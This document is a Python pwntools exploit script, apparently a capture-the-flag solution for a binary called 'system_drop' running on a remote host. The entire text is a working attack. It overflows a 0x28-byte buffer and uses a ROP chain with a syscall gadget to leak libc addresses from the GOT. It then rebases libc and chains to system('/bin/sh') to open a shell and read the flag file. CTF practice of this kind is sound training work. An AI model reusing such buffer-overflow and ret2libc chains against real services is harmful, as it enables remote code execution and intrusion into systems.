from pwn import *

conn = remote('165.227.232.115', 32363)

elf = ELF("system_drop")
elf_rop = ROP(elf)

offset_overflow = b"A" * (0x28)

offset = b"A" * 0x28

def leak_got(entry):
    with log.progress("leaking got entry for %s" % entry) as progress:
        progress.status("forging rop")
        rop = offset
        rop += p64(elf_rop.find_gadget(["pop rsi"])[0])
        rop += p64(elf.got[entry])
        rop += p64(0)
        # Address of a gadget: syscall, ret
        rop += p64(0x0040053b)
        rop += p64(elf.symbols["main"])

        progress.status("sending rop")
        conn.send(rop)

        progress.status("computing leak address")
        return u64(conn.recv(0x100)[:0x8])

leak_main = leak_got("__libc_start_main")
leak_read = leak_got("read")

log.info("Leak __libc_start_main %x" % leak_main)
log.info("Leak read %x" % leak_read)

# Once we've the address of __libc_start_main and read we can use
# a website like https://libc.blukat.me to find the libc currenly
# used.

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = leak_read - libc.symbols["read"]

rop = offset
rop += p64(elf_rop.find_gadget(['ret'])[0])
rop += p64(elf_rop.find_gadget(["pop rdi", "ret"])[0])
rop += p64(next(libc.search(b"/bin/sh")))
rop += p64(libc.sym["system"])
rop += p64(libc.sym["exit"])

conn.send(rop)
conn.sendline("cat flag.txt")
log.success(conn.recvlineS())
